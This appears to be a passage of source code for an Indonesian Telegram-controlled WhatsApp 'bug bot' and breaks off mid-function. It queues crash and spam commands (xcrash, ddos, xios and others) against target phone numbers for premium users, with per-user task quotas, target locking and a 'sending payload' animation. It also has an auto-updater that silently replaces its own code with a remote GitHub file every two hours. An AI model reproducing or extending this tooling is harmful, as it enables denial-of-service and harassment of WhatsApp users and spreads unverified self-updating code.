const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
    makeWASocket,
    makeCacheableSignalKeyStore,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    fetchLatestWaWebVersion,
    DisconnectReason,
    Browsers,
    delay,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessageFromContent,
    generateWAMessageContent,
    generateForwardMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    prepareWAMessageContent,
    getContentType,
    getAggregateVotesInPollMessage,
    getStream,
    areJidsSameUser,
    jidDecode,
    jidEncode,
    mentionedJid,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    GroupMetadata,
    WAGroupMetadata,
    WAGroupInviteMessage,
    AuthenticationState,
    initInMemoryKeyStore,
    BufferJSON,
    useSingleFileAuthState,
    removeAuthState,
    MediaType,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    WAMediaUpload,
    WAMessage,
    WAMessageContent,
    WAMessageStatus,
    InteractiveMessage,
    templateMessage,
    Header,
    proto,
    WAProto,
    MessageType,
    MessageTypeProto,
    MessageOptions,
    ChatModification,
    ReconnectMode,
    WAContextInfo,
    WALocationMessage,
    WATextMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAUrlInfo,
    URL_REGEX,
    WA_DEFAULT_EPHEMERAL,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    PHONENUMBER_MCC,
    MediaConnInfo,
    GroupSettingChange,
    WAFlag,
    WANode,
    WAMetric,
    Presence,
    AnyMessageContent,
    WASocket,
    isBaileys,
    encodeSignedDeviceIdentity,
    encodeWAMessage,
    encodeNewsletterMessage,
    decryptMessageNode,
    generateMessageID,
    generateMessageIDV2,
    generateMessageTag,
    patchMessageBeforeSending,
    relayWAMessage,
    processTime,
    Browser,
    BaileysError,
    MessageRetryMap,
    ProxyAgent,
    waChatKey
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const vm = require('vm');
const https = require('https');
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS, LOG_GROUP_ID, CHANNEL_USERNAME } = require("./config.js");
const crypto = require('crypto');
const { exec } = require("child_process");

// ============================================================
// [GLOBAL STATE]
// ============================================================
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isReconnecting = false;
let lastActivity = Date.now();

const sessionPath = './session';
const bot = new Telegraf(BOT_TOKEN);

// ============================================================
// [FOTO TUNGGAL UNTUK SEMUA MENU]
// Ganti URL di bawah dengan foto kamu sendiri.
// ============================================================
const MENU_PHOTO = "https://ibb.co.com/xKwxMjtm";
const getRandomImage = () => MENU_PHOTO;

// ============================================================
// VALIDASI CONFIG
// ============================================================
if (!OWNER_IDS || (Array.isArray(OWNER_IDS) && OWNER_IDS.length === 0)) {
  console.error('❌ OWNER_IDS kosong! Cek config.js');
  process.exit(1);
}

// ============================================================
// AUTO UPDATE CONFIG
// ============================================================
const UPDATE_URL =
  "https://raw.githubusercontent.com/cistiansaputraa-alt/yanduyy/main/index.js";
const UPDATE_HEADERS = { "User-Agent": "RafaelBot-Updater" };
const UPDATE_FILE_PATH = path.join(__dirname, "index.js");
const UPDATE_TEMP_PATH = path.join(__dirname, ".index.tmp.js");
const UPDATE_BACKUP_PATH = path.join(__dirname, "index.js.backup");
const UPDATE_FLAG_PATH = path.join(__dirname, ".last-update");
const IS_CHILD = process.env.RAFAEL_CHILD === "1";

const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const OWNER_ID = Array.isArray(OWNER_IDS) ? OWNER_IDS[0] : OWNER_IDS;
const ownerID = OWNER_ID;

const isOwner = (userId) => {
  const id = String(userId);
  return Array.isArray(OWNER_IDS)
    ? OWNER_IDS.map(String).includes(id)
    : String(OWNER_IDS) === id;
};

// ============================================================
// [INIT FOLDER Db/ & FILE JSON]
// ============================================================
const DB_DIR = path.join(__dirname, "Db");
if (!fs.existsSync(DB_DIR)) {
  fs.mkdirSync(DB_DIR, { recursive: true });
  console.log(chalk.green("[INIT] Folder Db/ dibuat."));
}

if (!fs.existsSync(sessionPath)) {
  fs.mkdirSync(sessionPath, { recursive: true });
  console.log(chalk.green("[INIT] Folder session/ dibuat."));
}

// ============================================================
// [KOMPONEN 1] ROUND-ROBIN QUEUE
// ============================================================
const RR_CONFIG = {
  MAX_CONCURRENT_USERS: 5,
  MAX_TASKS_PER_USER: 225,
  TICK_DELAY_MS: 500,
  USER_COOLDOWN_MS: 30 * 1000
};

class RoundRobinQueue {
  constructor(config = RR_CONFIG) {
    this.slots = new Map();
    this.order = [];
    this.currentIndex = 0;
    this.loopRunning = false;
    this.config = config;
    this.totalProcessed = 0;
    this.startedAt = Date.now();
    this.cooldownMap = new Map();
  }

  canAdd(userId) {
    if (this.slots.has(userId)) return { ok: true };

    const cd = this.cooldownMap.get(userId);
    if (cd && Date.now() < cd) {
      const sisa = Math.ceil((cd - Date.now()) / 1000);
      return { ok: false, reason: `Tunggu ${sisa}s lagi sebelum kirim bug baru` };
    }

    if (this.slots.size >= this.config.MAX_CONCURRENT_USERS) {
      return {
        ok: false,
        reason: `Server penuh (${this.slots.size}/${this.config.MAX_CONCURRENT_USERS} user). Coba lagi nanti.`
      };
    }

    return { ok: true };
  }

  addBatch(userId, tasks, meta = {}) {
    const check = this.canAdd(userId);
    if (!check.ok) throw new Error(check.reason);

    const existing = this.slots.get(userId);
    const currentTotal = existing ? existing.tasks.length : 0;
    const newTotal = currentTotal + tasks.length;

    if (newTotal > this.config.MAX_TASKS_PER_USER) {
      throw new Error(
        `Slot kamu penuh! Total: ${currentTotal}, maks ${this.config.MAX_TASKS_PER_USER}. ` +
        `Tunggu selesai dulu sebelum nambah bug.`
      );
    }

    if (!this.slots.has(userId)) {
      this.slots.set(userId, { tasks: [], meta });
      this.order.push(userId);
      this.cooldownMap.delete(userId);
      console.log(`[RR] ➕ User ${userId} masuk slot (${this.order.length}/${this.config.MAX_CONCURRENT_USERS})`);
    }

    const slot = this.slots.get(userId);
    slot.tasks.push(...tasks);
    if (meta.cmd) slot.meta = meta;

    this._startLoop();
    return {
      pending: slot.tasks.length,
      position: this.order.indexOf(userId) + 1,
      totalUsers: this.order.length
    };
  }

  add(task, meta = {}) {
    const userId = meta.userId || 'system';
    
    if (!this.slots.has(userId)) {
      if (userId !== 'system' && this.slots.size >= this.config.MAX_CONCURRENT_USERS) {
        throw new Error(`Server penuh (${this.slots.size}/${this.config.MAX_CONCURRENT_USERS})`);
      }
      this.slots.set(userId, { tasks: [], meta });
      this.order.push(userId);
    }
    
    const slot = this.slots.get(userId);
    if (slot.tasks.length >= this.config.MAX_TASKS_PER_USER && userId !== 'system') {
      throw new Error(`Slot penuh (max ${this.config.MAX_TASKS_PER_USER})`);
    }
    
    slot.tasks.push(task);
    if (meta.cmd) slot.meta = { ...slot.meta, ...meta };
    
    this._startLoop();
    return { pending: slot.tasks.length };
  }

  async _startLoop() {
    if (this.loopRunning) return;
    this.loopRunning = true;
    this.startedAt = Date.now();

    let waitCount = 0;

    while (this.order.length > 0) {
      if (!sock || !isWhatsAppConnected) {
        await new Promise(r => setTimeout(r, 1000));
        waitCount++;
        if (waitCount > 60) {
          console.log('[RR] ⚠️ WA tidak connect 60 detik, hentikan loop sementara.');
          break;
        }
        continue;
      }
      waitCount = 0;

      let attempts = 0;
      let picked = null;

      while (attempts < this.order.length + 1) {
        if (this.currentIndex >= this.order.length) this.currentIndex = 0;
        if (this.order.length === 0) break;

        const userId = this.order[this.currentIndex];
        const slot = this.slots.get(userId);

        if (slot && slot.tasks.length > 0) {
          picked = { userId, slot };
          break;
        }

        if (slot && slot.tasks.length === 0) {
          this.slots.delete(userId);
          this.order.splice(this.currentIndex, 1);
          if (userId !== 'system') {
            this.cooldownMap.set(userId, Date.now() + this.config.USER_COOLDOWN_MS);
          }
          console.log(`[RR] ➖ User ${userId} selesai. Sisa user: ${this.order.length}`);
          continue;
        }

        this.currentIndex++;
        attempts++;
      }

      if (!picked) {
        this.order = [];
        this.slots.clear();
        this.currentIndex = 0;
        break;
      }

      const { userId, slot } = picked;
      const task = slot.tasks.shift();

      try {
        await task();
        this.totalProcessed++;
        console.log(`[RR] ✓ User ${userId} | sisa: ${slot.tasks.length} | cmd: ${slot.meta.cmd || '-'}`);
      } catch (err) {
        console.error(`[RR] ✗ User ${userId} gagal: ${err.message}`);
      }

      this.currentIndex++;
      await new Promise(r => setTimeout(r, this.config.TICK_DELAY_MS));
    }

    this.loopRunning = false;
    console.log(`[RR] ✅ Semua slot selesai. Total task: ${this.totalProcessed}`);
    this.totalProcessed = 0;
  }

  get length() {
    let total = 0;
    for (const slot of this.slots.values()) total += slot.tasks.length;
    return total;
  }

  get users() { return this.order.length; }

  snapshot() {
    const list = [];
    for (let i = 0; i < this.order.length; i++) {
      const userId = this.order[i];
      const slot = this.slots.get(userId);
      if (!slot) continue;
      list.push({
        no: i + 1,
        userId,
        tasks: slot.tasks.length,
        cmd: slot.meta.cmd || '-',
        target: slot.meta.target || '-',
        isCurrent: i === this.currentIndex
      });
    }
    return {
      users: this.order.length,
      maxUsers: this.config.MAX_CONCURRENT_USERS,
      totalTasks: this.length,
      tickDelay: this.config.TICK_DELAY_MS,
      elapsed: Math.floor((Date.now() - this.startedAt) / 1000),
      list
    };
  }
}

const sendQueue = new RoundRobinQueue(RR_CONFIG);

// ============================================================
// [KOMPONEN 2] TARGET LOCK
// ============================================================
const targetLocks = new Map();

async function withTargetLock(target, fn) {
  while (targetLocks.get(target)) {
    await new Promise(r => setTimeout(r, 200));
  }
  targetLocks.set(target, true);
  try {
    return await fn();
  } finally {
    targetLocks.delete(target);
  }
}

// ============================================================
// [ANIMASI LOADING]
// ============================================================
const LOADING_STEPS = [
  { pct: 0,   bar: "▱▱▱▱▱", icon: "⏳", text: "Menyiapkan bug..." },
  { pct: 20,  bar: "▰▱▱▱▱", icon: "🔄", text: "Mengirim payload..." },
  { pct: 40,  bar: "▰▰▱▱▱", icon: "🔄", text: "Mengunci target..." },
  { pct: 60,  bar: "▰▰▰▱▱", icon: "🔄", text: "Mengeksekusi bug..." },
  { pct: 80,  bar: "▰▰▰▰▱", icon: "🔄", text: "Menstabilkan sinyal..." },
  { pct: 100, bar: "▰▰▰▰▰", icon: "✅", text: "Bug Terkirim!" }
];

async function showLoadingAnimation(ctx, target, info = {}) {
  const chatId = ctx.chat.id;
  const q = String(target).replace("@s.whatsapp.net", "").replace(/[^0-9]/g, "");

  const buildMsg = (step) => {
    return (
      `${step.icon} *${step.text}*\n\n` +
      `\`[${step.bar}] ${step.pct}%\`\n\n` +
      `🎯 Target : \`${q}\`\n` +
      `📊 Antrian : *${info.position || 1}/${info.totalUsers || 1}* user\n` +
      `📦 Sisa task : *${info.pending || '-'}*`
    );
  };

  let msg;
  try {
    msg = await ctx.reply(buildMsg(LOADING_STEPS[0]), {
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error("[LOADING] Gagal kirim pesan awal:", e.message);
    return null;
  }

  for (let i = 1; i < LOADING_STEPS.length; i++) {
    await new Promise(r => setTimeout(r, 1000));
    try {
      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        null,
        buildMsg(LOADING_STEPS[i]),
        { parse_mode: "Markdown" }
      );
    } catch (e) {
      if (!String(e.message).includes("message is not modified")) {
        console.error(`[LOADING] Edit step ${i} gagal:`, e.message);
      }
    }
  }

  try {
    await ctx.telegram.editMessageReplyMarkup(
      chatId,
      msg.message_id,
      null,
      {
        inline_keyboard: [[
          { text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }
        ]]
      }
    );
  } catch (e) {}

  return msg;
}

// ============================================================
// [SAFE RELAY]
// ============================================================
function isSockAlive(s) {
  return !!(s && s.user && s.ws && s.ws.readyState === 1 && isWhatsAppConnected);
}

// ============================================================
// [GLOBAL ERROR HANDLER]
// ============================================================
process.on('unhandledRejection', (reason) => {
  const msg = String(reason?.message || reason);
  if (msg.includes('Connection Closed') || msg.includes('Stream Errored')) {
    console.log(`\x1b[33m[UNHANDLED] Diabaikan: ${msg}\x1b[0m`);
    return;
  }
  console.error('\x1b[31m[UNHANDLED REJECTION]\x1b[0m', reason);
});

process.on('uncaughtException', (err) => {
  console.error('\x1b[31m[UNCAUGHT]\x1b[0m', err);
});

// ============================================================
// PATH FILE
// ============================================================
const premiumFile = "./Db/premiums.json";
const adminFile = "./Db/admins.json";
const dbPath = "./Db/ControlCommand.json";
const cooldownFile = './Db/cooldown.json';

const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err.message);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

function loadDB() {
  if (!fs.existsSync(dbPath)) return {};
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDB(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

// ============================================================
// DAFTAR SEMUA BUG COMMAND UNTUK MENU
// ============================================================
const BUG_MENU_LIST = [
  'xspam', 'xcrash', 'culture', 'crack',
  'payload', 'forcex', 'culturelag', 'lages',
  'bandgb', 'ddos', 'zras', 'xios1', 'xios2', 'xios3'
];

/**
 * Cek status command bug:
 * - Kalau disabled global (via /blockcmd) → ❌
 * - Kalau aktif → ✅
 */
function getCmdStatus(cmd) {
  try {
    const db = loadDB();
    const key = '/' + cmd.replace(/^\//, '');
    if (db.commands?.[key]?.disabled === true) return ' ❌';
    if (db.commands?.[key]?.disabled === false) return ' ✅';
    return ' ✅';
  } catch {
    return ' ✅';
  }
}

// ============================================================
// Init file JSON default — ✅ COOLDOWN DEFAULT 20 DETIK
// ============================================================
const initFiles = {
  [premiumFile]: [],
  [adminFile]: [],
  [dbPath]: { commands: {} },
  [cooldownFile]: { cooldown: 20 },
};
for (const [file, defaultVal] of Object.entries(initFiles)) {
  if (!fs.existsSync(file)) {
    fs.writeFileSync(file, JSON.stringify(defaultVal, null, 2));
  }
}

// ============================================================
// [APPROVED GROUPS]
// ============================================================
const APPROVED_GROUPS_FILE = path.join(__dirname, "approved_groups.json");
let approvedGroups = [];
let pendingGroups = new Map();

function loadApprovedGroups() {
  try {
    if (fs.existsSync(APPROVED_GROUPS_FILE)) {
      const raw = fs.readFileSync(APPROVED_GROUPS_FILE, "utf8");
      const parsed = JSON.parse(raw);
      approvedGroups = Array.isArray(parsed) ? parsed : [];
    } else {
      approvedGroups = [];
    }
  } catch (err) {
    console.error("Gagal load approved groups:", err.message);
    approvedGroups = [];
  }
}

function saveApprovedGroups() {
  try {
    fs.writeFileSync(APPROVED_GROUPS_FILE, JSON.stringify(approvedGroups, null, 2));
  } catch (err) {
    console.error("Gagal save approved groups:", err.message);
  }
}

function isGroupApproved(chatId) {
  return approvedGroups.includes(String(chatId));
}

loadApprovedGroups();

// ============================================================
// LOAD DATA
// ============================================================
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// ============================================================
// [SISTEM REST BOT]
// ============================================================
const BUG_REST_CONFIG = {
  MAX_BUG_COMMANDS: 40,
  WINDOW_MS: 11 * 60 * 1000,
  REST_DURATION_MS: 5 * 60 * 1000,
};

const bugTracker = {
  count: 0,
  firstBugTime: null,
  isResting: false,
  restUntil: null,
  restTimer: null,
  windowTimer: null,
};

const BUG_COMMANDS = [
  'xspam', 'xcrash', 'culture', 'crack',
  'payload', 'forcex', 'culturelag', 'lages',
  'bandgb', 'ddos', 'zras', 'xios1', 'xios2', 'xios3'
];

function isBugCommand(text) {
  if (!text || !text.startsWith('/')) return false;
  let cmd = text.split(' ')[0].toLowerCase().replace('@', '').replace('/', '');
  return BUG_COMMANDS.includes(cmd);
}

async function startRestMode() {
  if (bugTracker.restTimer) clearTimeout(bugTracker.restTimer);
  if (bugTracker.windowTimer) clearTimeout(bugTracker.windowTimer);

  bugTracker.isResting = true;
  bugTracker.restUntil = Date.now() + BUG_REST_CONFIG.REST_DURATION_MS;

  const totalBug = bugTracker.count;
  bugTracker.count = 0;
  bugTracker.firstBugTime = null;

  const restEnd = new Date(bugTracker.restUntil);
  const restEndStr = formatDateTime(restEnd);

  console.log(chalk.red.bold(`
╔══════════════════════════════════════╗
║  🛑 BOT MASUK MODE REST              ║
║  Total Bug: ${totalBug} command
║  Rest Until: ${restEndStr}
╚══════════════════════════════════════╝
  `));

  try {
    await bot.telegram.sendMessage(
      OWNER_ID,
      `🛑 *BOT MODE REST AKTIF*\n\n` +
      `📊 Total Bug : *${totalBug}* command\n` +
      `⏰ Rest Sampai : *${restEndStr}*\n` +
      `⏳ Durasi : *10 menit*\n\n` +
      `ℹ️ Selama rest, hanya *Owner & Admin* yang bisa pakai command.`,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    console.error('[REST] Gagal notif owner:', e.message);
  }

  if (LOG_GROUP_ID) {
    try {
      await bot.telegram.sendMessage(
        LOG_GROUP_ID,
        `🛑 *BOT MODE REST AKTIF*\n\n` +
        `📊 Total Bug : *${totalBug}* command\n` +
        `⏰ Rest Sampai : *${restEndStr}*`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {}
  }

  bugTracker.restTimer = setTimeout(async () => {
    bugTracker.isResting = false;
    bugTracker.restUntil = null;

    console.log(chalk.green.bold('\n✅ BOT KEMBALI NORMAL — Rest selesai.\n'));

    try {
      await bot.telegram.sendMessage(
        OWNER_ID,
        `✅ *BOT KEMBALI NORMAL*\n\nMode rest selesai. Semua user bisa pakai command lagi.`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {}
  }, BUG_REST_CONFIG.REST_DURATION_MS);
}

function trackBugCommand() {
  if (bugTracker.isResting) return;

  const now = Date.now();

  if (bugTracker.firstBugTime && (now - bugTracker.firstBugTime) > BUG_REST_CONFIG.WINDOW_MS) {
    bugTracker.count = 0;
    bugTracker.firstBugTime = null;
    if (bugTracker.windowTimer) clearTimeout(bugTracker.windowTimer);
  }

  if (!bugTracker.firstBugTime) {
    bugTracker.firstBugTime = now;
    bugTracker.windowTimer = setTimeout(() => {
      if (!bugTracker.isResting) {
        bugTracker.count = 0;
        bugTracker.firstBugTime = null;
      }
    }, BUG_REST_CONFIG.WINDOW_MS);
  }

  bugTracker.count++;

  console.log(chalk.yellow(
    `[BUG-TRACKER] ${bugTracker.count}/${BUG_REST_CONFIG.MAX_BUG_COMMANDS} command bug dalam window 5 menit`
  ));

  if (bugTracker.count >= BUG_REST_CONFIG.MAX_BUG_COMMANDS) {
    if (bugTracker.windowTimer) clearTimeout(bugTracker.windowTimer);
    startRestMode().catch(err =>
      console.error('[REST] Gagal start:', err.message)
    );
  }
}

async function checkRestMode(ctx, next) {
  if (!bugTracker.isResting) return next();
  if (!ctx.from) return next();

  const userId = ctx.from.id.toString();
  const isOwnerUser = isOwner(userId);
  const isAdminUser = adminUsers.includes(userId);

  if (isOwnerUser || isAdminUser) return next();

  const sisaMs = bugTracker.restUntil - Date.now();
  if (sisaMs <= 0) return next();

  const sisaMenit = Math.floor(sisaMs / 60000);
  const sisaDetik = Math.floor((sisaMs % 60000) / 1000);

  await ctx.reply(
    `🛑 *BOT SEDANG ISTIRAHAT*\n\n` +
    `⏳ Sisa waktu : *${sisaMenit} menit ${sisaDetik} detik*\n` +
    `📊 Total bug yang dijalankan : *${bugTracker.count}* command\n\n` +
    `ℹ️ Hanya *Owner & Admin* yang bisa pakai command saat ini.\n` +
    `Bot akan kembali normal otomatis.`,
    { parse_mode: 'Markdown' }
  );
  return;
}

// ============================================================
// COOLDOWN KHUSUS hardcore & core
// ============================================================
const SPECIAL_CD_MS = 10 * 60 * 1000;
const specialCooldowns = new Map();

const checkSpecialCooldown = (ctx, next) => {
  if (!ctx.from) return next();
  const userId = ctx.from.id.toString();
  const text = ctx.message?.text || '';
  let cmd = text.split(' ')[0].toLowerCase().replace('@', '').replace('/', '');

  if (!['hardcore', 'core', 'fxcperma', 'overload'].includes(cmd)) return next();

  const key = `${userId}_${cmd}`;
  const now = Date.now();
  const lastUsed = specialCooldowns.get(key);

  if (lastUsed) {
    const diff = now - lastUsed;
    if (diff < SPECIAL_CD_MS) {
      const sisaMs = SPECIAL_CD_MS - diff;
      const sisaMenit = Math.floor(sisaMs / 60000);
      const sisaDetik = Math.floor((sisaMs % 60000) / 1000);

      ctx.reply(
        `⏳ *Cooldown Command /${cmd}*\n\n` +
        `Kamu baru saja memakai command ini.\n` +
        `⏰ Sisa waktu : *${sisaMenit} menit ${sisaDetik} detik*\n\n` +
        `ℹ️ Command \`/${cmd}\` hanya bisa dipakai 1x per 2 menit.`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
  }

  specialCooldowns.set(key, now);
  next();
};

// ============================================================
// COOLDOWN UMUM — ✅ DEFAULT 20 DETIK PERMANEN
// ============================================================
const loadCooldown = () => {
  try {
    const data = fs.readFileSync(cooldownFile);
    const val = JSON.parse(data).cooldown;

    // ✅ Kalau file ada & cooldown > 0 → pakai itu
    if (typeof val === 'number' && val > 0) return val;

    // ✅ Kalau kosong/0 → tulis ulang 20 permanen
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: 20 }, null, 2));
    return 20;
  } catch {
    // ✅ File belum ada → buat dengan 20 permanen
    try {
      fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: 20 }, null, 2));
    } catch {}
    return 20;
  }
};

const saveCooldown = (seconds) => {
  fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2));
};

let cooldown = loadCooldown();
const userCooldowns = new Map();

const checkCooldown = (ctx, next) => {
  if (!ctx.from) return next();
  const userId = ctx.from.id;
  const now = Date.now();

  if (userCooldowns.has(userId)) {
    const lastUsed = userCooldowns.get(userId);
    const diff = (now - lastUsed) / 1000;

    if (diff < cooldown) {
      const remaining = Math.ceil(cooldown - diff);
      ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`);
      return;
    }
  }

  userCooldowns.set(userId, now);
  next();
};

// ============================================================
// FUNGSI ADMIN / PREMIUM
// ============================================================
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};

// ============================================================
// MIDDLEWARE ROLE
// ============================================================
const checkOwner = (ctx, next) => {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();
  if (!OWNER_IDS.map(String).includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!ctx.from) return;
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = async (ctx, next) => {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat?.id?.toString();
  const isOwnerUser = isOwner(userId);

  const bisaAkses =
    premiumUsers.includes(userId) ||
    isGroupPremium(chatId) ||
    isOwnerUser;

  if (!bisaAkses) {
    await ctx.reply(
      '❌ Fitur ini khusus *Premium!*\n\n' +
      '💡 Hubungi owner untuk upgrade premium.',
      { parse_mode: 'Markdown' }
    );
    return;
  }

  return next();
};

// ============================================================
// CEK COMMAND ENABLED
// ============================================================
const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) return next();

  if (isBugCommand(text)) {
    trackBugCommand();
  }

  let cmd = text.split(" ")[0].toLowerCase();
  if (cmd.includes("@")) cmd = cmd.split("@")[0];

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason || "⛔ Command ini dimatikan."
    );
  }

  const blocked = db.groupCmdBlock?.[chatId] || [];
  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply("⛔ Command ini diblock di chat ini.");
  }

  return next();
};

// ============================================================
// UPTIME
// ============================================================
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

// ============================================================
// AUTO UPDATE
// ============================================================
function downloadUpdate(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath);
    let settled = false;
    const finish = (error) => {
      if (settled) return;
      settled = true;
      file.close(() => {
        if (error) fs.rm(outputPath, { force: true }, () => {});
        error ? reject(error) : resolve();
      });
    };

    const request = https.get(
      url,
      { headers: { "User-Agent": "RafaelBot-Updater" }, timeout: 30000 },
      (res) => {
        if (res.statusCode !== 200) {
          res.resume();
          return finish(new Error(`HTTP_${res.statusCode}`));
        }
        res.pipe(file);
        file.once("finish", () => finish());
      }
    );
    request.setTimeout(30000, () => request.destroy(new Error("UPDATE_TIMEOUT")));
    request.once("error", finish);
    file.once("error", finish);
  });
}

async function performUpdate(ctx) {
  const msg = await ctx.reply("🔄 *Memeriksa update...*", { parse_mode: "Markdown" });

  try {
    if (fs.existsSync(UPDATE_FILE_PATH)) {
      fs.copyFileSync(UPDATE_FILE_PATH, UPDATE_BACKUP_PATH);
    }

    await downloadUpdate(UPDATE_URL, UPDATE_TEMP_PATH);

    const newContent = fs.readFileSync(UPDATE_TEMP_PATH, "utf8");
    if (!newContent || newContent.length < 1000 || !newContent.includes("require(")) {
      throw new Error("File update tidak valid / korup");
    }

    const currentContent = fs.readFileSync(UPDATE_FILE_PATH, "utf8");
    if (currentContent === newContent) {
      fs.rm(UPDATE_TEMP_PATH, { force: true }, () => {});
      await ctx.telegram.editMessageText(
        msg.chat.id, msg.message_id, null,
        "✅ *Bot sudah versi terbaru!*",
        { parse_mode: "Markdown" }
      );
      return;
    }

    fs.renameSync(UPDATE_TEMP_PATH, UPDATE_FILE_PATH);

    await ctx.telegram.editMessageText(
      msg.chat.id, msg.message_id, null,
      "✅ *Update berhasil!*\n\n♻️ Bot restart otomatis dalam 3 detik...\n📦 Backup: `index.js.backup`",
      { parse_mode: "Markdown" }
    );

    console.log(chalk.green.bold("[UPDATE] File diperbarui. Restart otomatis..."));
    setTimeout(() => process.kill(process.pid, 'SIGTERM'), 3000);
  } catch (err) {
    console.error(chalk.red(`[UPDATE] Gagal: ${err.message}`));
    try {
      if (fs.existsSync(UPDATE_BACKUP_PATH)) {
        fs.copyFileSync(UPDATE_BACKUP_PATH, UPDATE_FILE_PATH);
        console.log(chalk.yellow("[UPDATE] Rollback."));
      }
    } catch {}
    await ctx.telegram.editMessageText(
      msg.chat.id, msg.message_id, null,
      `❌ *Gagal update!*\n\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  } finally {
    try { if (fs.existsSync(UPDATE_TEMP_PATH)) fs.rmSync(UPDATE_TEMP_PATH, { force: true }); } catch {}
  }
}

function startUpdateChecker() {
  const CHECK_INTERVAL = 2 * 60 * 60 * 1000;
  let isUpdating = false;

  async function checkOnce(isBootTime = false) {
    if (isUpdating) return false;

    try {
      const res = await axios.get(UPDATE_URL, {
        headers: UPDATE_HEADERS,
        timeout: 15000,
        responseType: "text",
      });

      const remoteContent = res.data;
      const localContent = fs.readFileSync(UPDATE_FILE_PATH, "utf8");

      const hash = (s) => crypto.createHash("md5").update(s).digest("hex");
      const isSame = remoteContent && hash(remoteContent) === hash(localContent);

      if (!remoteContent || isSame || !remoteContent.includes("require(")) {
        if (isBootTime) {
          console.log(chalk.green.bold("[UPDATE] Bot sudah versi terbaru ✅"));
        } else {
          console.log(chalk.gray(`[UPDATE] Cek rutin: sudah versi terbaru (${new Date().toLocaleTimeString()})`));
        }
        return false;
      }

      isUpdating = true;
      console.log(chalk.yellow.bold("[UPDATE] Versi baru terdeteksi! Mengunduh..."));

      fs.copyFileSync(UPDATE_FILE_PATH, UPDATE_BACKUP_PATH);
      await downloadUpdate(UPDATE_URL, UPDATE_TEMP_PATH);

      const newContent = fs.readFileSync(UPDATE_TEMP_PATH, "utf8");
      if (!newContent || !newContent.includes("require(")) {
        throw new Error("File update tidak valid");
      }

      fs.renameSync(UPDATE_TEMP_PATH, UPDATE_FILE_PATH);
      console.log(chalk.green.bold("[UPDATE] Berhasil diperbarui."));

      if (isBootTime) {
        if (fs.existsSync(UPDATE_FLAG_PATH)) {
          const last = Number(fs.readFileSync(UPDATE_FLAG_PATH, "utf8")) || 0;
          if (Date.now() - last < 5 * 60 * 1000) {
            console.log(chalk.yellow("[UPDATE] Skip restart — baru update <5 menit lalu."));
            isUpdating = false;
            return false;
          }
        }
        fs.writeFileSync(UPDATE_FLAG_PATH, String(Date.now()));
        console.log(chalk.cyan.bold("[UPDATE] Restart untuk pakai versi baru..."));
        process.kill(process.pid, 'SIGTERM');
      }

      try {
        await bot.telegram.sendMessage(
          OWNER_ID,
          "🔄 *Auto-Update Berhasil!*\n\nBot restart otomatis.",
          { parse_mode: "Markdown" }
        );
      } catch {}

      setTimeout(() => process.kill(process.pid, 'SIGTERM'), 3000);
      return true;
    } catch (err) {
